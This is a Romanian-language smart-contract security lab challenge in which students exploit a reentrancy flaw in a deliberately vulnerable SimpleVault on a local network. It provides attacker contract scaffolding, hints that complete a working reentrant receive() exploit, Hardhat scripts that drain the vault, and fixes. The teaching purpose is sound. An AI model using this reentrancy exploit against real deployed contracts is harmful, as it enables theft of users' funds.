# ⚔️ Challenge 2: Reentrancy Attack - "Breaking the Vault"

**Dificultate**: 🟡 Intermediate  
**Puncte**: 40  
**Durată estimată**: 60-90 minute

## 📖 Povestea

După descoperirea furtului din Challenge 1, EtherBank a angajat o firmă de audit extern care a identificat o **vulnerabilitate critică** în contractul **SimpleVault** - sistemul care gestionează depozitele clienților.

Vulnerabilitatea este de tip **Reentrancy** - unul dintre cele mai periculoase attack-uri în DeFi, care a dus la:
- **The DAO Hack (2016)**: $60 milioane furate
- **Uniswap/Lendf.Me (2020)**: $25 milioane furate
- Zeci de alte protocoale compromise

**Misiunea ta**: În calitate de penetration tester, trebuie să:
1. Analizezi codul contractului și identifici vulnerabilitatea
2. Scrii un contract de attack care exploatează vulnerabilitatea
3. Demonstrezi impact-ul prin drenarea fondurilor
4. Propui o soluție de remediere

---

## 🎯 Obiective

### Obiectiv 1: Analiza Vulnerabilității (15 puncte)

Studiază contractul `SimpleVault.sol` și răspunde:

1. **Identifică funcția vulnerabilă**: Care funcție permite reentrancy?
2. **Explică pattern-ul vulnerabil**: De ce ordinea operațiilor creează vulnerabilitatea?
3. **Identifică condițiile de exploatare**: Ce trebuie să îndeplinească atacatorul?
4. **Estimează impact-ul**: Câți ETH pot fi furați?

### Obiectiv 2: Implementare Attack Contract (25 puncte)

Scrie un contract de attack (`VaultAttacker.sol`) care:

1. Depune o sumă inițială în vault (ex: 1 ETH)
2. Apelează funcția vulnerabilă pentru a declanșa atacul
3. Folosește `receive()` sau `fallback()` pentru reentrancy
4. Extrage fondurile furate în contul atacatorului

---

## 🧠 Concepte Teoretice

### Ce este Reentrancy?

**Reentrancy** apare când un contract face un external call către un contract nesigur înainte de a-și actualiza starea internă. Contractul atacator poate "re-entra" și apela din nou funcția vulnerabilă.

### Pattern-ul Vulnerabil

```solidity
// ❌ VULNERABIL
function withdraw(uint amount) public {
    require(balances[msg.sender] >= amount);
    
    // 1. Trimitem ETH (external call)
    msg.sender.call{value: amount}("");
    
    // 2. Actualizăm starea (prea târziu!)
    balances[msg.sender] -= amount;
}
```

### Cum Funcționează Atacul?

```
1. Atacator depune 1 ETH → balanța: 1 ETH
2. Atacator apelează withdraw(1 ETH)
3. Vault trimite 1 ETH → trigger fallback() al atacatorului
4. În fallback(), atacatorul apelează DIN NOU withdraw(1 ETH)
5. Verificarea trece! (balanța încă nu a fost actualizată)
6. Vault trimite încă 1 ETH → trigger fallback() din nou
7. Procesul se repetă până vault-ul este golit sau gas-ul se termină
```

### Flow Diagram

```
┌─────────────┐                    ┌──────────────┐
│  Atacator   │                    │ SimpleVault  │
│  Contract   │                    │   balances:  │
└──────┬──────┘                    │   Attacker=1 │
       │                           │   Total=100  │
       │ 1. withdraw(1 ETH)        └──────┬───────┘
       ├──────────────────────────────────>│
       │                                   │
       │ 2. send 1 ETH                     │
       │<──────────────────────────────────┤
       │                                   │
       │ receive() triggered!              │
       │                                   │
       │ 3. withdraw(1 ETH) again!         │
       ├──────────────────────────────────>│
       │                                   │ ⚠️ balanța NU a fost
       │ 4. send 1 ETH again               │    actualizată încă!
       │<──────────────────────────────────┤
       │                                   │
       │ receive() triggered again!        │
       │ ...repetă până vault = 0...       │
```

### Pattern-ul Securizat: Checks-Effects-Interactions

```solidity
// ✅ SECURIZAT
function withdraw(uint amount) public {
    // 1. CHECKS: Verificări
    require(balances[msg.sender] >= amount);
    
    // 2. EFFECTS: Actualizare stare
    balances[msg.sender] -= amount;
    
    // 3. INTERACTIONS: External calls
    msg.sender.call{value: amount}("");
}
```

---

## 📝 Pași de Urmat

### Setup Inițial

1. **Navighează în directorul lab-ului**:
   ```bash
   cd ~/lab4-blockchain-defi
   ```

2. **Pornește Ganache** (dacă nu rulează deja):
   ```bash
   ./start-ganache.sh
   ```

3. **Deploy contractul vulnerabil**:
   ```bash
   npx hardhat run scripts/deploy-simple-vault.js --network localhost
   ```
   
   Output:
   ```
   SimpleVault deployed to: 0x5FbDB2315678afecb367f032d93F642f64180aa3
   Contract funded with 100 ETH
   ```
   
   **Salvează adresa contractului** - o vei folosi mai târziu!

### Pasul 1: Analizează Codul Vulnerabil

1. **Deschide contractul în VS Code**:
   ```bash
   code contracts/SimpleVault.sol
   ```

2. **Citește cu atenție funcția `withdraw()`**:

```solidity
function withdraw(uint256 _amount) public {
    require(balances[msg.sender] >= _amount, "Insufficient balance");
    
    // ⚠️ Unde este problema aici?
    (bool success, ) = msg.sender.call{value: _amount}("");
    require(success, "Transfer failed");
    
    balances[msg.sender] -= _amount;
    totalDeposits -= _amount;
    
    emit Withdrawal(msg.sender, _amount);
}
```

3. **Întrebări de analiză** (răspunde în raport):
   - Ce se întâmplă când `msg.sender` este un contract, nu un EOA (Externally Owned Account)?
   - Ce funcție se execută când un contract primește ETH?
   - În ce moment este actualizată `balances[msg.sender]`?
   - Poate contractul atacator să apeleze `withdraw()` din nou înainte de actualizare?

### Pasul 2: Scrie Contractul de Attack

Ai 2 opțiuni:

#### Opțiunea A: Pornește de la Template (Recomandat pentru începători)

```bash
code contracts/VaultAttacker.sol
```

Completează template-ul `VaultAttackerTemplate` urmând TODO-urile.

#### Opțiunea B: Scrie de la Zero (Pentru cei experimentați)

Creează un nou fișier `contracts/MyAttacker.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISimpleVault {
    function deposit() external payable;
    function withdraw(uint256 _amount) external;
    function getBalance() external view returns (uint256);
}

contract MyVaultAttacker {
    ISimpleVault public vault;
    address public owner;
    uint256 public withdrawAmount;
    
    constructor(address _vaultAddress) {
        vault = ISimpleVault(_vaultAddress);
        owner = msg.sender;
    }
    
    // TODO: Implementează funcțiile necesare
    
    receive() external payable {
        // TODO: Aici se întâmplă magia reentrancy-ului!
    }
}
```

### Pasul 3: Compilează Contractul

```bash
npx hardhat compile
```

Verifică că nu sunt erori:
```
Compiled 3 Solidity files successfully
```

### Pasul 4: Deploy Contractul de Attack

Creează script de deploy `scripts/deploy-attacker.js`:

```javascript
const hre = require("hardhat");

async function main() {
  // Adresa SimpleVault (din pasul anterior)
  const vaultAddress = "0x5FbDB2315678afecb367f032d93F642f64180aa3";
  
  console.log("Deploying VaultAttacker...");
  
  const VaultAttacker = await hre.ethers.getContractFactory("VaultAttacker");
  const attacker = await VaultAttacker.deploy(vaultAddress);
  await attacker.deployed();
  
  console.log(`VaultAttacker deployed to: ${attacker.address}`);
  
  return attacker.address;
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

Rulează:
```bash
npx hardhat run scripts/deploy-attacker.js --network localhost
```

### Pasul 5: Execută Atacul

Creează script de attack `scripts/execute-attack.js`:

```javascript
const hre = require("hardhat");

async function main() {
  const vaultAddress = "0x5FbDB2315678afecb367f032d93F642f64180aa3";
  const attackerAddress = "0x..."; // Adresa ta de attacker
  
  // Conectează-te la contracte
  const vault = await hre.ethers.getContractAt("SimpleVault", vaultAddress);
  const attacker = await hre.ethers.getContractAt("VaultAttacker", attackerAddress);
  
  console.log("📊 Starea inițială:");
  const vaultBalanceBefore = await hre.ethers.provider.getBalance(vaultAddress);
  console.log(`Vault balance: ${hre.ethers.utils.formatEther(vaultBalanceBefore)} ETH`);
  
  // Pasul 1: Depune 1 ETH în vault prin attacker
  console.log("\n💰 Depunere 1 ETH în vault...");
  const depositTx = await attacker.depositToVault({ 
    value: hre.ethers.utils.parseEther("1.0") 
  });
  await depositTx.wait();
  console.log("✅ Deposit complet");
  
  // Verifică balanța atacatorului în vault
  const attackerBalance = await vault.balances(attacker.address);
  console.log(`Attacker balance în vault: ${hre.ethers.utils.formatEther(attackerBalance)} ETH`);
  
  // Pasul 2: Execută atacul
  console.log("\n⚔️ Execută atacul de reentrancy...");
  const attackTx = await attacker.attack();
  const receipt = await attackTx.wait();
  
  console.log(`Gas used: ${receipt.gasUsed.toString()}`);
  
  // Verifică rezultatul
  console.log("\n📊 Starea finală:");
  const vaultBalanceAfter = await hre.ethers.provider.getBalance(vaultAddress);
  const attackerContractBalance = await hre.ethers.provider.getBalance(attacker.address);
  
  console.log(`Vault balance: ${hre.ethers.utils.formatEther(vaultBalanceAfter)} ETH`);
  console.log(`Attacker contract balance: ${hre.ethers.utils.formatEther(attackerContractBalance)} ETH`);
  
  const stolen = vaultBalanceBefore.sub(vaultBalanceAfter).sub(hre.ethers.utils.parseEther("1.0"));
  console.log(`\n💰 ETH furat: ${hre.ethers.utils.formatEther(stolen)} ETH`);
  
  if (stolen.gt(0)) {
    console.log("\n🎉 ATACUL A REUȘIT!");
  } else {
    console.log("\n❌ Atacul a eșuat. Verifică codul.");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

Rulează:
```bash
npx hardhat run scripts/execute-attack.js --network localhost
```

### Pasul 6: Extrage Fondurile

```javascript
// În scripts/extract-funds.js
const attacker = await hre.ethers.getContractAt("VaultAttacker", attackerAddress);
const extractTx = await attacker.extractStolenFunds();
await extractTx.wait();
console.log("✅ Fonduri extrase în contul tău");
```

---

## 🔍 Debugging & Troubleshooting

### Problema: Atacul nu funcționează

**Verificări:**

1. **Ai suficient gas?**
   ```javascript
   const attackTx = await attacker.attack({ gasLimit: 3000000 });
   ```

2. **Receive function se execută?**
   Adaugă event-uri pentru debugging:
   ```solidity
   receive() external payable {
       emit ReentrancyTriggered(attackCount);
       // ... rest of code
   }
   ```

3. **Balanța în vault este corectă?**
   ```javascript
   const balance = await vault.balances(attacker.address);
   console.log("Balance:", balance.toString());
   ```

### Problema: "Out of Gas"

Reentrancy consumă mult gas! Soluții:

1. **Limitează numărul de recursii**:
   ```solidity
   uint256 public maxAttacks = 5;
   
   receive() external payable {
       if (attackCount < maxAttacks && ...) {
           // attack
       }
   }
   ```

2. **Crește gas limit-ul**:
   ```javascript
   { gasLimit: 5000000 }
   ```

### Problema: "Transfer failed"

Verifică că:
- Vault-ul are fonduri (minimum 2x suma ta)
- Ai depus mai întâi în vault
- Funcția `receive()` nu consumă tot gas-ul

---

## ✅ Criteriu de Notare

| Task | Puncte | Cerințe |
|------|--------|---------|
| **Analiza vulnerabilității** | 15p | Identifici corect pattern-ul și explici |
| **Contract funcțional** | 15p | Contractul compilează și poate fi deployed |
| **Exploit reușit** | 10p | Reușești să furi minimum 50% din vault |
| **BONUS: 100% drained** | +5p | Drenezi complet vault-ul |
| **TOTAL** | **40p** | (+5p bonus) |

---

## 📤 Livrabile

### 1. Codul Contractului

Fișier: `MyVaultAttacker.sol` (sau template completat)

### 2. Raport de Analiz ă

Fișier: `challenge2-report.md`

```markdown
# Challenge 2: Reentrancy Attack - Raport

**Student**: [Nume]
**Data**: [Data]

## Partea 1: Analiza Vulnerabilității

### Identificarea Problemei

**Funcția vulnerabilă**: `withdraw()` (linia X)

**Explicație**:
[Descrie în cuvintele tale de ce funcția este vulnerabilă]

**Pattern-ul vulnerabil**:
```solidity
[Code snippet cu problema evidențiată]
```

**De ce este periculos**:
[Impact-ul vulnerabilității]

### Flow-ul Atacului

```
1. [Pasul 1]
2. [Pasul 2]
...
```

## Partea 2: Implementarea Exploitului

### Contract Address-uri
- SimpleVault: 0x...
- VaultAttacker: 0x...

### Rezultate

**Înainte de atac:**
- Vault balance: X ETH
- Attacker balance: Y ETH

**După atac:**
- Vault balance: X2 ETH
- Attacker balance: Y2 ETH
- **ETH furat**: Z ETH

### Screenshots
[Include screenshot cu output-ul scriptului]

## Partea 3: Soluția de Remediere

### Varianta 1: Checks-Effects-Interactions

```solidity
[Codul corect]
```

### Varianta 2: ReentrancyGuard

```solidity
[Implementare cu modifier]
```

### Recomandări
[Ce ar trebui să facă EtherBank pentru a preveni asta]

## Concluzii

[Ce ai învățat din acest challenge]
```

---

## 💡 Hints

<details>
<summary>🔍 Hint 1: Nu știu cum să implementez receive()</summary>

```solidity
receive() external payable {
    // Această funcție se execută automat când contractul primește ETH
    
    // Verifică dacă mai sunt fonduri în vault
    if (address(vault).balance >= withdrawAmount) {
        // Apelează din nou withdraw!
        vault.withdraw(withdrawAmount);
    }
}
```
</details>

<details>
<summary>🔍 Hint 2: Cum trimit ETH la deposit?</summary>

```javascript
// JavaScript
await attacker.depositToVault({ 
    value: ethers.utils.parseEther("1.0") 
});
```

```solidity
// Solidity - în contract
vault.deposit{value: msg.value}();
```
</details>

<details>
<summary>🔍 Hint 3: Atacul drenează doar puțin</summary>

Problema: Gas-ul se termină prea repede.

Soluție:
```solidity
uint256 public maxAttacks = 3; // Start mic
uint256 public attackCount;

receive() external payable {
    attackCount++;
    if (attackCount < maxAttacks && address(vault).balance >= withdrawAmount) {
        vault.withdraw(withdrawAmount);
    }
}
```

Apoi crește treptat `maxAttacks` până găsești optim-ul.
</details>

---

## 🎓 Resurse Suplimentare

### Cazuri Reale

**The DAO Hack (2016)**
- $60M furat prin reentrancy
- A dus la hard fork-ul Ethereum → Ethereum Classic
- [Post-mortem analysis](https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/)

**Lendf.Me Hack (2020)**
- $25M furat
- Reentrancy în protocol DeFi
- Fondurile au fost returnate de hacker

### Tools & Libraries

**OpenZeppelin ReentrancyGuard**:
```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract MyContract is ReentrancyGuard {
    function withdraw() public nonReentrant {
        // Protected!
    }
}
```

### Video Tutorials
- [Reentrancy Attacks Explained - Smart Contract Programmer](https://www.youtube.com/watch?v=4Mm3BCyHtDY)
- [The DAO Hack Explained](https://www.youtube.com/watch?v=rNeLuBOVe8A)

---

**Succes la hacking, White Hat! ⚔️**

*"With great power comes great responsibility. Use your skills for good."*
